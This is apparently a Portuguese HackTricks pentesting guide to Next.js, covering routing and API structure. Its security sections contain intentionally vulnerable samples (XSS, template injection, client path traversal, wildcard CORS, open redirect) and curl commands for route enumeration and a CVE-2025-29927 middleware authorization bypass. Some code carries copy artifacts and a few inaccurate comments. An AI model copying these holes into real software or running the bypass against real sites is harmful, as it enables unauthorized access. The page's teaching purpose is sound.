# NextJS

{{#include ../../banners/hacktricks-training.md}}

## Arquitetura Geral de uma Aplicação Next.js

### Estrutura de Arquivos Típica

Um projeto Next.js padrão segue uma estrutura específica de arquivos e diretórios que facilita seus recursos como rotas, endpoints de API e gerenciamento de recursos estáticos. Aqui está um layout típico:
```lua
my-nextjs-app/
├── node_modules/
├── public/
│   ├── images/
│   │   └── logo.png
│   └── favicon.ico
├── app/
│   ├── api/
│   │   └── hello/
│   │       └── route.ts
│   ├── layout.tsx
│   ├── page.tsx
│   ├── about/
│   │   └── page.tsx
│   ├── dashboard/
│   │   ├── layout.tsx
│   │   └── page.tsx
│   ├── components/
│   │   ├── Header.tsx
│   │   └── Footer.tsx
│   ├── styles/
│   │   ├── globals.css
│   │   └── Home.module.css
│   └── utils/
│       └── api.ts
├── .env.local
├── next.config.js
├── tsconfig.json
├── package.json
├── README.md
└── yarn.lock / package-lock.json

```
### Diretórios e Arquivos Principais

- **public/:** Hospeda assets estáticos como imagens, fonts e outros arquivos. Arquivos aqui são acessíveis no caminho raiz (`/`).
- **app/:** Diretório central para as páginas, layouts, componentes e rotas de API da sua aplicação. Abraça o paradigma **App Router**, permitindo recursos avançados de roteamento e segregação de componentes entre servidor e cliente.
- **app/layout.tsx:** Define o layout raiz da sua aplicação, envolvendo todas as páginas e provendo elementos de UI consistentes como headers, footers e barras de navegação.
- **app/page.tsx:** Serve como ponto de entrada para a rota raiz `/`, renderizando a página inicial.
- **app/[route]/page.tsx:** Lida com rotas estáticas e dinâmicas. Cada pasta dentro de `app/` representa um segmento de rota, e o `page.tsx` dentro dessas pastas corresponde ao componente da rota.
- **app/api/:** Contém rotas de API, permitindo criar funções serverless que manipulam requisições HTTP. Essas rotas substituem o tradicional diretório `pages/api`.
- **app/components/:** Abriga componentes React reutilizáveis que podem ser utilizados em diferentes páginas e layouts.
- **app/styles/:** Contém arquivos CSS globais e CSS Modules para estilização com escopo por componente.
- **app/utils/:** Inclui funções utilitárias, módulos helper e outra lógica não-UI que pode ser compartilhada pela aplicação.
- **.env.local:** Armazena variáveis de ambiente específicas do ambiente de desenvolvimento local. Essas variáveis **não** são incluídas no controle de versão.
- **next.config.js:** Customiza o comportamento do Next.js, incluindo configurações do webpack, variáveis de ambiente e configurações de segurança.
- **tsconfig.json:** Configura as opções do TypeScript para o projeto, habilitando verificação de tipos e outras funcionalidades do TypeScript.
- **package.json:** Gerencia dependências do projeto, scripts e metadados.
- **README.md:** Fornece documentação e informações sobre o projeto, incluindo instruções de setup, diretrizes de uso e outros detalhes relevantes.
- **yarn.lock / package-lock.json:** Travem as dependências do projeto em versões específicas, garantindo instalações consistentes em diferentes ambientes.

## Lado do Cliente no Next.js

### Roteamento baseado em arquivos no diretório `app`

O diretório `app` é a pedra angular do roteamento nas versões mais recentes do Next.js. Ele aproveita o sistema de arquivos para definir rotas, tornando o gerenciamento de rotas intuitivo e escalável.

<details>

<summary>Tratando o caminho raiz /</summary>

**Estrutura de Arquivos:**
```arduino
my-nextjs-app/
├── app/
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Arquivos-chave:**

- **`app/page.tsx`**: Lida com requisições para o caminho raiz `/`.
- **`app/layout.tsx`**: Define o layout da aplicação, envolvendo todas as páginas.

**Implementação:**
```tsx
tsxCopy code// app/page.tsx

export default function HomePage() {
return (
<div>
<h1>Welcome to the Home Page!</h1>
<p>This is the root route.</p>
</div>
);
}
```
**Explicação:**

- **Definição de Rota:** O arquivo `page.tsx` diretamente dentro do diretório `app` corresponde à rota `/`.
- **Renderização:** Este componente renderiza o conteúdo da página inicial.
- **Integração de Layout:** O componente `HomePage` é envolvido por `layout.tsx`, que pode incluir headers, footers e outros elementos comuns.

</details>

<details>

<summary>Tratando Outros Caminhos Estáticos</summary>

**Exemplo: Rota `/about`**

**Estrutura de Arquivos:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── about/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementação:**
```tsx
// app/about/page.tsx

export default function AboutPage() {
return (
<div>
<h1>About Us</h1>
<p>Learn more about our mission and values.</p>
</div>
)
}
```
**Explicação:**

- **Definição da rota:** O arquivo `page.tsx` dentro da pasta `about` corresponde à rota `/about`.
- **Renderização:** Este componente renderiza o conteúdo da página about.

</details>

<details>

<summary>Rotas Dinâmicas</summary>

Rotas dinâmicas permitem lidar com caminhos com segmentos variáveis, permitindo que aplicações exibam conteúdo com base em parâmetros como IDs, slugs, etc.

**Exemplo: `/posts/[id]` Rota**

**Estrutura de arquivos:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── posts/
│   │   └── [id]/
│   │       └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementação:**
```tsx
tsxCopy code// app/posts/[id]/page.tsx

import { useRouter } from 'next/navigation';

interface PostProps {
params: { id: string };
}

export default function PostPage({ params }: PostProps) {
const { id } = params;
// Fetch post data based on 'id'

return (
<div>
<h1>Post #{id}</h1>
<p>This is the content of post {id}.</p>
</div>
);
}
```
**Explicação:**

- **Segmento Dinâmico:** `[id]` denota um segmento dinâmico na rota, capturando o parâmetro `id` da URL.
- **Acesso aos Parâmetros:** O objeto `params` contém os parâmetros dinâmicos, acessíveis dentro do componente.
- **Correspondência de Rotas:** Qualquer caminho que combine com `/posts/*`, como `/posts/1`, `/posts/abc`, etc., será tratado por este componente.

</details>

<details>

<summary>Rotas Aninhadas</summary>

Next.js suporta roteamento aninhado, permitindo estruturas de rotas hierárquicas que espelham a organização de diretórios.

**Exemplo: `/dashboard/settings/profile` Rota**

**Estrutura de Arquivos:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── dashboard/
│   │   ├── settings/
│   │   │   └── profile/
│   │   │       └── page.tsx
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementação:**
```tsx
tsxCopy code// app/dashboard/settings/profile/page.tsx

export default function ProfileSettingsPage() {
return (
<div>
<h1>Profile Settings</h1>
<p>Manage your profile information here.</p>
</div>
);
}
```
**Explicação:**

- **Aninhamento Profundo:** O arquivo `page.tsx` dentro de `dashboard/settings/profile/` corresponde à rota `/dashboard/settings/profile`.
- **Reflexo de Hierarquia:** A estrutura de diretórios reflete o caminho da URL, facilitando a manutenção e a clareza.

</details>

<details>

<summary>Rotas Catch-All</summary>

Rotas catch-all lidam com múltiplos segmentos aninhados ou caminhos desconhecidos, oferecendo flexibilidade no tratamento de rotas.

**Exemplo: `/*` Route**

**Estrutura de Arquivos:**
```arduino
my-nextjs-app/
├── app/
│   ├── [...slug]/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementação:**
```tsx
// app/[...slug]/page.tsx

interface CatchAllProps {
params: { slug: string[] }
}

export default function CatchAllPage({ params }: CatchAllProps) {
const { slug } = params
const fullPath = `/${slug.join("/")}`

return (
<div>
<h1>Catch-All Route</h1>
<p>You have navigated to: {fullPath}</p>
</div>
)
}
```
**Explicação:**

- **Segmento Catch-All:** `[...slug]` captura todos os segmentos de caminho restantes como um array.
- **Uso:** Útil para lidar com cenários de roteamento dinâmico, como paths gerados por usuários, categorias aninhadas, etc.
- **Correspondência de Rotas:** Caminhos como `/anything/here`, `/foo/bar/baz`, etc., são tratados por este componente.

</details>

### Potenciais Vulnerabilidades no Lado do Cliente

Embora o Next.js forneça uma base segura, práticas de codificação impróprias podem introduzir vulnerabilidades. As principais vulnerabilidades do lado do cliente incluem:

<details>

<summary>Cross-Site Scripting (XSS)</summary>

Ataques XSS ocorrem quando scripts maliciosos são injetados em sites confiáveis. Atacantes podem executar scripts nos navegadores dos usuários, roubando dados ou realizando ações em nome do usuário.

**Exemplo de Código Vulnerável:**
```jsx
// Dangerous: Injecting user input directly into HTML
function Comment({ userInput }) {
return <div dangerouslySetInnerHTML={{ __html: userInput }} />
}
```
**Por que é vulnerável:** Usar `dangerouslySetInnerHTML` com entrada não confiável permite que atacantes injetem scripts maliciosos.

</details>

<details>

<summary>Client-Side Template Injection</summary>

Ocorre quando entradas do usuário são tratadas incorretamente em templates, permitindo que atacantes injetem e executem templates ou expressões.

**Exemplo de Código Vulnerável:**
```jsx
import React from "react"
import ejs from "ejs"

function RenderTemplate({ template, data }) {
const html = ejs.render(template, data)
return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```
**Por que é vulnerável:** Se `template` ou `data` incluir conteúdo malicioso, isso pode levar à execução de código não intencional.

</details>

<details>

<summary>Client Path Traversal</summary>

É uma vulnerabilidade que permite a atacantes manipular caminhos do lado do cliente para executar ações não intencionais, como Cross-Site Request Forgery (CSRF).

Ao contrário do server-side path traversal, que tem como alvo o sistema de arquivos do servidor, CSPT foca em explorar mecanismos do lado do cliente para redirecionar requisições de API legítimas para endpoints maliciosos.

**Exemplo de Código Vulnerável:**

Uma aplicação Next.js permite que usuários enviem e baixem arquivos. O recurso de download é implementado no lado do cliente, onde os usuários podem especificar o caminho do arquivo para download.
```jsx
// pages/download.js
import { useState } from "react"

export default function DownloadPage() {
const [filePath, setFilePath] = useState("")

const handleDownload = () => {
fetch(`/api/files/${filePath}`)
.then((response) => response.blob())
.then((blob) => {
const url = window.URL.createObjectURL(blob)
const a = document.createElement("a")
a.href = url
a.download = filePath
a.click()
})
}

return (
<div>
<h1>Download File</h1>
<input
type="text"
value={filePath}
onChange={(e) => setFilePath(e.target.value)}
placeholder="Enter file path"
/>
<button onClick={handleDownload}>Download</button>
</div>
)
}
```
#### Cenário de Ataque

1. **Objetivo do atacante**: Realizar um ataque CSRF para excluir um arquivo crítico (por exemplo, `admin/config.json`) manipulando o `filePath`.
2. **Explorando CSPT**:
- **Entrada maliciosa**: O atacante cria uma URL com um `filePath` manipulado como `../deleteFile/config.json`.
- **Chamada API resultante**: O código do lado do cliente faz uma requisição para `/api/files/../deleteFile/config.json`.
- **Tratamento pelo servidor**: Se o servidor não validar o `filePath`, ele processa a requisição, potencialmente excluindo ou expondo arquivos sensíveis.
3. **Executando CSRF**:
- **Link malicioso**: O atacante envia à vítima um link ou incorpora um script malicioso que dispara a requisição de download com o `filePath` manipulado.
- **Resultado**: A vítima executa a ação sem saber, levando a acesso ou exclusão não autorizada de arquivos.

#### Por que é vulnerável

- **Falta de validação de entrada**: O lado do cliente permite entradas arbitrárias em `filePath`, permitindo path traversal.
- **Confiança nas entradas do cliente**: A API do lado do servidor confia e processa o `filePath` sem sanitização.
- **Possíveis ações da API**: Se o endpoint da API realiza ações que alteram estado (por exemplo, excluir, modificar arquivos), ele pode ser explorado via CSPT.

</details>

### Recon: descoberta de rotas em export estático via _buildManifest

Quando `nextExport`/`autoExport` são true (export estático), Next.js expõe o `buildId` no HTML e serve um build manifest em `/_next/static/<buildId>/_buildManifest.js`. O array `sortedPages` e o mapeamento route→chunk ali enumeram cada página pré-renderizada sem brute force.

- Capture o buildId a partir da resposta root (frequentemente impresso no rodapé) ou a partir de tags `<script>` que carregam `/_next/static/<buildId>/...`.
- Busque o manifest e extraia as rotas:
```bash
build=$(curl -s http://target/ | grep -oE '"buildId":"[^"]+"' | cut -d: -f2 | tr -d '"')
curl -s "http://target/_next/static/${build}/_buildManifest.js" | grep -oE '"(/[a-zA-Z0-9_\[\]\-/]+)"' | tr -d '"'
```
- Use os caminhos descobertos (por exemplo `/docs`, `/docs/content/examples`, `/signin`) para orientar testes de autenticação e descoberta de endpoints.

## Lado do Servidor em Next.js

### Renderização Server-Side (SSR)

As páginas são renderizadas no servidor a cada requisição, garantindo que o usuário receba HTML totalmente renderizado. Neste caso você deve criar seu próprio servidor customizado para processar as requisições.

**Casos de Uso:**

- Conteúdo dinâmico que muda frequentemente.
- Otimização de SEO, já que os mecanismos de busca podem rastrear a página totalmente renderizada.

**Implementação:**
```jsx
// pages/index.js
export async function getServerSideProps(context) {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data } }
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Geração Estática de Sites (SSG)

As páginas são pré-renderizadas no momento do build, resultando em tempos de carregamento mais rápidos e menor carga no servidor.

**Casos de Uso:**

- Conteúdo que não muda com frequência.
- Blogs, documentação, páginas de marketing.

**Implementação:**
```jsx
// pages/index.js
export async function getStaticProps() {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data }, revalidate: 60 } // Revalidate every 60 seconds
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Funções Serverless (Rotas de API)

Next.js permite a criação de endpoints de API como funções serverless. Essas funções são executadas sob demanda sem a necessidade de um servidor dedicado.

**Casos de Uso:**

- Tratamento de envios de formulários.
- Interação com bancos de dados.
- Processamento de dados ou integração com APIs de terceiros.

**Implementação:**

Com a introdução do diretório `app` no Next.js 13, o roteamento e o tratamento de API se tornaram mais flexíveis e poderosos. Essa abordagem moderna se alinha de perto com o sistema de roteamento baseado em arquivos, mas introduz capacidades aprimoradas, incluindo suporte a componentes server e client.

#### Manipulador de Rota Básico

**Estrutura de Arquivos:**
```go
my-nextjs-app/
├── app/
│   └── api/
│       └── hello/
│           └── route.js
├── package.json
└── ...
```
**Implementação:**
```javascript
// app/api/hello/route.js

export async function POST(request) {
return new Response(JSON.stringify({ message: "Hello from App Router!" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

// Client-side fetch to access the API endpoint
fetch("/api/submit", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ name: "John Doe" }),
})
.then((res) => res.json())
.then((data) => console.log(data))
```
**Explicação:**

- **Localização:** Rotas da API são colocadas no diretório `app/api/`.
- **Nomeação de Arquivos:** Cada endpoint da API reside em sua própria pasta contendo um arquivo `route.js` ou `route.ts`.
- **Funções Exportadas:** Em vez de um único default export, são exportadas funções específicas para métodos HTTP (ex.: `GET`, `POST`).
- **Tratamento de Resposta:** Use o construtor `Response` para retornar respostas, permitindo maior controle sobre headers e códigos de status.

#### Como lidar com outros caminhos e métodos:

<details>

<summary>Tratando Métodos HTTP Específicos</summary>

Next.js 13+ permite definir manipuladores para métodos HTTP específicos dentro do mesmo arquivo `route.js` ou `route.ts`, promovendo um código mais claro e organizado.

**Exemplo:**
```javascript
// app/api/users/[id]/route.js

export async function GET(request, { params }) {
const { id } = params
// Fetch user data based on 'id'
return new Response(JSON.stringify({ userId: id, name: "Jane Doe" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function PUT(request, { params }) {
const { id } = params
// Update user data based on 'id'
return new Response(JSON.stringify({ message: `User ${id} updated.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function DELETE(request, { params }) {
const { id } = params
// Delete user based on 'id'
return new Response(JSON.stringify({ message: `User ${id} deleted.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Explicação:**

- **Múltiplas Exportações:** Cada método HTTP (`GET`, `PUT`, `DELETE`) possui sua própria função exportada.
- **Parâmetros:** O segundo argumento fornece acesso aos parâmetros da rota via `params`.
- **Respostas Aprimoradas:** Maior controle sobre os objetos de resposta, permitindo gerenciamento preciso de cabeçalhos e códigos de status.

</details>

<details>

<summary>Rotas catch-all e aninhadas</summary>

Next.js 13+ suporta recursos avançados de roteamento como rotas catch-all e rotas API aninhadas, permitindo estruturas de API mais dinâmicas e escaláveis.

**Exemplo de rota catch-all:**
```javascript
// app/api/[...slug]/route.js

export async function GET(request, { params }) {
const { slug } = params
// Handle dynamic nested routes
return new Response(JSON.stringify({ slug }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Explicação:**

- **Sintaxe:** `[...]` denota um segmento catch-all, capturando todos os caminhos aninhados.
- **Uso:** Útil para APIs que precisam lidar com diferentes profundidades de rota ou segmentos dinâmicos.

**Exemplo de Rotas Aninhadas:**
```javascript
// app/api/posts/[postId]/comments/[commentId]/route.js

export async function GET(request, { params }) {
const { postId, commentId } = params
// Fetch specific comment for a post
return new Response(
JSON.stringify({ postId, commentId, comment: "Great post!" }),
{
status: 200,
headers: { "Content-Type": "application/json" },
}
)
}
```
**Explicação:**

- **Aninhamento Profundo:** Permite estruturas de API hierárquicas, refletindo relações entre recursos.
- **Acesso a Parâmetros:** Acessar facilmente múltiplos parâmetros de rota através do objeto `params`.

</details>

<details>

<summary>Manipulação de rotas de API no Next.js 12 e anteriores</summary>

## Rotas de API no Diretório `pages` (Next.js 12 e anteriores)

Antes do Next.js 13 introduzir o diretório `app` e capacidades de roteamento aprimoradas, as rotas de API eram definidas principalmente dentro do diretório `pages`. Essa abordagem ainda é amplamente utilizada e suportada nas versões Next.js 12 e anteriores.

#### Rota de API Básica

**Estrutura de Arquivos:**
```go
goCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── hello.js
├── package.json
└── ...
```
**Implementação:**
```javascript
javascriptCopy code// pages/api/hello.js

export default function handler(req, res) {
res.status(200).json({ message: 'Hello, World!' });
}
```
**Explicação:**

- **Localização:** As rotas da API ficam no diretório `pages/api/`.
- **Exportação:** Use `export default` para definir a função handler.
- **Assinatura da Função:** O handler recebe os objetos `req` (HTTP request) e `res` (HTTP response).
- **Roteamento:** O nome do arquivo (`hello.js`) mapeia para o endpoint `/api/hello`.

#### Rotas de API Dinâmicas

**Estrutura de Arquivos:**
```bash
bashCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── users/
│           └── [id].js
├── package.json
└── ...
```
**Implementação:**
```javascript
javascriptCopy code// pages/api/users/[id].js

export default function handler(req, res) {
const {
query: { id },
method,
} = req;

switch (method) {
case 'GET':
// Fetch user data based on 'id'
res.status(200).json({ userId: id, name: 'John Doe' });
break;
case 'PUT':
// Update user data based on 'id'
res.status(200).json({ message: `User ${id} updated.` });
break;
case 'DELETE':
// Delete user based on 'id'
res.status(200).json({ message: `User ${id} deleted.` });
break;
default:
res.setHeader('Allow', ['GET', 'PUT', 'DELETE']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Explicação:**

- **Dynamic Segments:** Colchetes (`[id].js`) indicam segmentos de rota dinâmicos.
- **Accessing Parameters:** Use `req.query.id` para acessar o parâmetro dinâmico.
- **Handling Methods:** Utilize lógica condicional para tratar os diferentes métodos HTTP (`GET`, `PUT`, `DELETE`, etc).

#### Lidando com Diferentes Métodos HTTP

Embora o exemplo básico de rota de API trate todos os métodos HTTP dentro de uma única função, você pode estruturar seu código para lidar com cada método explicitamente, visando maior clareza e manutenibilidade.

**Exemplo:**
```javascript
javascriptCopy code// pages/api/posts.js

export default async function handler(req, res) {
const { method } = req;

switch (method) {
case 'GET':
// Handle GET request
res.status(200).json({ message: 'Fetching posts.' });
break;
case 'POST':
// Handle POST request
res.status(201).json({ message: 'Post created.' });
break;
default:
res.setHeader('Allow', ['GET', 'POST']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Melhores Práticas:**

- **Separação de Responsabilidades:** Separe claramente a lógica para diferentes métodos HTTP.
- **Consistência de Resposta:** Garanta estruturas de resposta consistentes para facilitar o tratamento no lado do cliente.
- **Tratamento de Erros:** Trate de forma elegante métodos não suportados e erros inesperados.

</details>

### Configuração de CORS

Controle quais origens podem acessar suas rotas de API, mitigando vulnerabilidades de Cross-Origin Resource Sharing (CORS).

**Exemplo de Configuração Ruim:**
```javascript
// app/api/data/route.js

export async function GET(request) {
return new Response(JSON.stringify({ data: "Public Data" }), {
status: 200,
headers: {
"Access-Control-Allow-Origin": "*", // Allows any origin
"Access-Control-Allow-Methods": "GET, POST, PUT, DELETE",
},
})
}
```
Observe que **CORS também pode ser configurado em todas as rotas da API** dentro do arquivo **`middleware.ts`**:
```javascript
// app/middleware.ts

import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(request: NextRequest) {
const allowedOrigins = [
"https://yourdomain.com",
"https://sub.yourdomain.com",
]
const origin = request.headers.get("Origin")

const response = NextResponse.next()

if (allowedOrigins.includes(origin || "")) {
response.headers.set("Access-Control-Allow-Origin", origin || "")
response.headers.set(
"Access-Control-Allow-Methods",
"GET, POST, PUT, DELETE, OPTIONS"
)
response.headers.set(
"Access-Control-Allow-Headers",
"Content-Type, Authorization"
)
// If credentials are needed:
// response.headers.set('Access-Control-Allow-Credentials', 'true');
}

// Handle preflight requests
if (request.method === "OPTIONS") {
return new Response(null, {
status: 204,
headers: response.headers,
})
}

return response
}

export const config = {
matcher: "/api/:path*", // Apply to all API routes
}
```
**Problema:**

- **`Access-Control-Allow-Origin: '*'`:** Permite que qualquer site acesse a API, potencialmente permitindo que sites maliciosos interajam com sua API sem restrições.
- **Permissão ampla de métodos:** Permitir todos os métodos pode habilitar atacantes a realizar ações indesejadas.

**Como atacantes exploram isso:**

Atacantes podem criar sites maliciosos que fazem requisições à sua API, potencialmente abusando de funcionalidades como recuperação de dados, manipulação de dados ou acionando ações indesejadas em nome de usuários autenticados.


{{#ref}}
../../pentesting-web/cors-bypass.md
{{#endref}}

### Exposição de código do servidor no lado do cliente

É fácil **usar código do servidor também em código exposto e usado no lado do cliente**. A melhor forma de garantir que um arquivo de código nunca seja exposto no lado do cliente é usando este import no início do arquivo:
```js
import "server-only"
```
## Arquivos-chave e Seus Papéis

### `middleware.ts` / `middleware.js`

**Localização:** Raiz do projeto ou dentro de `src/`.

**Finalidade:** Executa código na função serverless do lado do servidor antes que uma requisição seja processada, permitindo tarefas como autenticação, redirecionamentos ou modificação de respostas.

**Fluxo de Execução:**

1. **Requisição de Entrada:** O middleware intercepta a requisição.
2. **Processamento:** Executa operações com base na requisição (ex.: verificar autenticação).
3. **Modificação da Resposta:** Pode alterar a resposta ou passar o controle para o próximo handler.

**Exemplos de Uso:**

- Redirecionar usuários não autenticados.
- Adicionar cabeçalhos personalizados.
- Registrar requisições.

**Exemplo de Configuração:**
```typescript
// middleware.ts
import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(req: NextRequest) {
const url = req.nextUrl.clone()
if (!req.cookies.has("token")) {
url.pathname = "/login"
return NextResponse.redirect(url)
}
return NextResponse.next()
}

export const config = {
matcher: ["/protected/:path*"],
}
```
### Middleware authorization bypass (CVE-2025-29927)

Se a autorização for aplicada em middleware, as versões afetadas do Next.js (<12.3.5 / 13.5.9 / 14.2.25 / 15.2.3) podem ser bypassed ao injetar o cabeçalho `x-middleware-subrequest`. O framework irá pular a recursão do middleware e retornar a página protegida.

- O comportamento padrão costuma ser um redirecionamento 307 para uma rota de login como `/api/auth/signin`.
- Envie um valor longo para `x-middleware-subrequest` (repita `middleware` para atingir `MAX_RECURSION_DEPTH`) para inverter a resposta para 200:
```bash
curl -i "http://target/docs" \
-H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
```
- Porque páginas autenticadas carregam muitos subrecursos, adicione o cabeçalho a cada requisição (por exemplo, Burp Match/Replace com uma string de match vazia) para evitar que os recursos sejam redirecionados.

### `next.config.js`

**Localização:** Raiz do projeto.

**Propósito:** Configura o comportamento do Next.js, habilitando ou desabilitando recursos, personalizando configurações do webpack, definindo variáveis de ambiente e configurando várias funcionalidades de segurança.

**Principais Configurações de Segurança:**

<details>

<summary>Cabeçalhos de Segurança</summary>

Os cabeçalhos de segurança aumentam a segurança da sua aplicação instruindo os navegadores sobre como tratar o conteúdo. Eles ajudam a mitigar vários ataques como Cross-Site Scripting (XSS), Clickjacking e MIME type sniffing:

- Content Security Policy (CSP)
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security (HSTS)
- Referrer Policy

**Exemplos:**
```javascript
// next.config.js

module.exports = {
async headers() {
return [
{
source: "/(.*)", // Apply to all routes
headers: [
{
key: "X-Frame-Options",
value: "DENY",
},
{
key: "Content-Security-Policy",
value:
"default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval';",
},
{
key: "X-Content-Type-Options",
value: "nosniff",
},
{
key: "Strict-Transport-Security",
value: "max-age=63072000; includeSubDomains; preload", // Enforces HTTPS
},
{
key: "Referrer-Policy",
value: "no-referrer", // Completely hides referrer
},
// Additional headers...
],
},
]
},
}
```
</details>

<details>

<summary>Configurações de Otimização de Imagens</summary>

Next.js otimiza imagens para performance, mas configurações incorretas podem levar a vulnerabilidades de segurança, como permitir que fontes não confiáveis injetem conteúdo malicioso.

**Exemplo de Configuração Ruim:**
```javascript
// next.config.js

module.exports = {
images: {
domains: ["*"], // Allows images from any domain
},
}
```
**Problema:**

- **`'*'`:** Permite que imagens sejam carregadas de qualquer origem externa, incluindo domínios não confiáveis ou maliciosos. Atacantes podem hospedar imagens contendo malicious payloads ou conteúdo que engana os usuários.
- Outro problema pode ser permitir um domínio **onde qualquer pessoa pode enviar uma imagem** (como `raw.githubusercontent.com`)

**Como atacantes abusam disso:**

Ao injetar imagens de fontes maliciosas, atacantes podem realizar phishing attacks, exibir informações enganosas ou explorar vulnerabilidades em bibliotecas de renderização de imagens.

</details>

<details>

<summary>Exposição de Variáveis de Ambiente</summary>

Gerencie informações sensíveis como chaves de API e credenciais de banco de dados de forma segura, sem expô-las ao cliente.

#### a. Expondo Variáveis Sensíveis

**Exemplo de Má Configuração:**
```javascript
// next.config.js

module.exports = {
env: {
SECRET_API_KEY: process.env.SECRET_API_KEY, // Not exposed to the client
NEXT_PUBLIC_API_URL: process.env.NEXT_PUBLIC_API_URL, // Correctly prefixed for exposure to client
},
}
```
**Problema:**

- **`SECRET_API_KEY`:** Sem o prefixo `NEXT_PUBLIC_`, o Next.js não expõe variáveis para o cliente. Contudo, se for prefixada por engano (por exemplo, `NEXT_PUBLIC_SECRET_API_KEY`), ela se torna acessível no lado do cliente.

**Como atacantes abusam disso:**

Se variáveis sensíveis são expostas ao cliente, atacantes podem recuperá-las inspecionando o código do cliente ou as requisições de rede, obtendo acesso não autorizado a APIs, bancos de dados ou outros serviços.

</details>

<details>

<summary>Redirecionamentos</summary>

Gerencie redirecionamentos e rewrites de URL dentro da sua aplicação, garantindo que os usuários sejam direcionados apropriadamente sem introduzir open redirect vulnerabilities.

#### a. Open Redirect Vulnerability

**Exemplo de Configuração Ruim:**
```javascript
// next.config.js

module.exports = {
async redirects() {
return [
{
source: "/redirect",
destination: (req) => req.query.url, // Dynamically redirects based on query parameter
permanent: false,
},
]
},
}
```
**Problema:**

- **Destino Dinâmico:** Permite que usuários especifiquem qualquer URL, possibilitando open redirect attacks.
- **Confiar na Entrada do Usuário:** Redirecionamentos para URLs fornecidas pelos usuários sem validação podem levar a phishing, malware distribution ou credential theft.

**Como atacantes abusam disso:**

Atacantes podem criar URLs que aparentam originar do seu domínio, mas redirecionam usuários para sites maliciosos. Por exemplo:
```bash
https://yourdomain.com/redirect?url=https://malicious-site.com
```
Usuários que confiam no domínio original podem navegar, sem perceber, para sites maliciosos.

</details>

<details>

<summary>Configuração do Webpack</summary>

Personalizar as configurações do Webpack para sua aplicação Next.js pode, inadvertidamente, introduzir vulnerabilidades de segurança se não for feito com cuidado.

#### a. Expondo Módulos Sensíveis

**Exemplo de Configuração Incorreta:**
```javascript
// next.config.js

module.exports = {
webpack: (config, { isServer }) => {
if (!isServer) {
config.resolve.alias["@sensitive"] = path.join(__dirname, "secret-folder")
}
return config
},
}
```
**Problema:**

- **Exposing Sensitive Paths:** Criar aliases para diretórios sensíveis e permitir acesso client-side pode leak informações confidenciais.
- **Bundling Secrets:** Se arquivos sensíveis forem empacotados para o client, seus conteúdos ficam acessíveis através de source maps ou inspecionando o client-side code.

**Como atacantes abusam disso:**

Atacantes podem acessar ou reconstruir a estrutura de diretórios da aplicação, potencialmente encontrando e explorando arquivos ou dados sensíveis.

</details>

### `pages/_app.js` and `pages/_document.js`

#### **`pages/_app.js`**

**Propósito:** Substitui o componente App padrão, permitindo estado global, estilos e componentes de layout.

**Casos de uso:**

- Injetar CSS global.
- Adicionar wrappers de layout.
- Integrar bibliotecas de gerenciamento de estado.

**Exemplo:**
```jsx
// pages/_app.js
import "../styles/globals.css"

function MyApp({ Component, pageProps }) {
return <Component {...pageProps} />
}

export default MyApp
```
#### **`pages/_document.js`**

**Propósito:** Substitui o Document padrão, permitindo a personalização das tags HTML e Body.

**Casos de uso:**

- Modificar as tags `<html>` ou `<body>`.
- Adicionar meta tags ou scripts personalizados.
- Integrar fontes de terceiros.

**Exemplo:**
```jsx
// pages/_document.js
import Document, { Html, Head, Main, NextScript } from "next/document"

class MyDocument extends Document {
render() {
return (
<Html lang="en">
<Head>{/* Custom fonts or meta tags */}</Head>
<body>
<Main />
<NextScript />
</body>
</Html>
)
}
}

export default MyDocument
```
### Servidor Personalizado (Opcional)

**Propósito:** Embora o Next.js venha com um servidor integrado, você pode criar um servidor personalizado para casos de uso avançados, como roteamento personalizado ou integração com serviços backend existentes.

**Observação:** Usar um servidor personalizado pode limitar as opções de implantação, especialmente em plataformas como Vercel que otimizam para o servidor integrado do Next.js.

**Exemplo:**
```javascript
// server.js
const express = require("express")
const next = require("next")

const dev = process.env.NODE_ENV !== "production"
const app = next({ dev })
const handle = app.getRequestHandler()

app.prepare().then(() => {
const server = express()

// Custom route
server.get("/a", (req, res) => {
return app.render(req, res, "/a")
})

// Default handler
server.all("*", (req, res) => {
return handle(req, res)
})

server.listen(3000, (err) => {
if (err) throw err
console.log("> Ready on http://localhost:3000")
})
})
```
---

## Considerações Arquiteturais e de Segurança Adicionais

### Variáveis de Ambiente e Configuração

**Objetivo:** Gerenciar informações sensíveis e configurações fora da base de código.

**Melhores Práticas:**

- **Use arquivos `.env`:** Armazene variáveis como chaves de API em `.env.local` (excluído do controle de versão).
- **Acesse variáveis com segurança:** Use `process.env.VARIABLE_NAME` para acessar variáveis de ambiente.
